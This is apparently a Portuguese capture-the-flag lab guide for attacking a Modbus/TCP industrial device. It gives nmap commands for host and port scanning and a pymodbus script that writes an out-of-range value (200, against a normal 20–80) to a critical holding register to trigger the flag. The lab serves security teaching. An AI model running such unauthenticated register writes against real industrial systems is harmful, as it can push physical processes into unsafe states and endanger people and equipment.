# Desafio 01 — Exploração de Dispositivo Modbus/TCP

## Objetivo

Descobrir o host industrial na rede do laboratório, identificar o protocolo
de comunicação, ler o valor de uma variável crítica do processo e escrevê-lo
para um valor fora da faixa operacional normal, acionando a geração da flag.

---

## Dicas

### 1. Descoberta de hosts

A rede do laboratório é `172.28.0.0/24`. Comece mapeando os hosts ativos:

```bash
nmap -sn 172.28.0.0/24
```

### 2. Scan de portas

O protocolo industrial padrão usa a porta **502/TCP**. Verifique se ela está aberta no host encontrado:

```bash
nmap -p 502 172.28.0.20
```

### 3. Protocolo Modbus/TCP

Modbus/TCP não possui autenticação nativa. Qualquer cliente pode ler e
escrever registros diretamente. Utilize a biblioteca `pymodbus` (já
instalada neste container) para interagir com o servidor:

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.28.0.20", port=502)
client.connect()

# Ler o holding register de endereço 0
result = client.read_holding_registers(address=0, count=1, device_id=1)
print(result.registers)  # Valor inicial: 50

# Escrever um valor fora da faixa normal
client.write_register(address=0, value=200, device_id=1)

client.close()
```

### 4. Variável crítica

A variável de interesse é o **holding register de endereço 0**. A faixa
operacional normal é **20–80**. Para acionar a flag, escreva um valor
**≥ 150** nesse registro.

### 5. Ferramentas disponíveis

| Ferramenta   | Uso                                      |
|--------------|------------------------------------------|
| `nmap`       | Descoberta de hosts e portas             |
| `scapy`      | Construção e envio de pacotes customizados |
| `pymodbus`   | Cliente e servidor Modbus/TCP            |
| `netcat`     | Conexões TCP genéricas                   |

### 6. Validação da flag

A flag é gerada automaticamente quando o valor do registro crítico atinge
ou ultrapassa 150. A validação da flag ocorre por fora deste container
(plataforma web / guia do cenário).
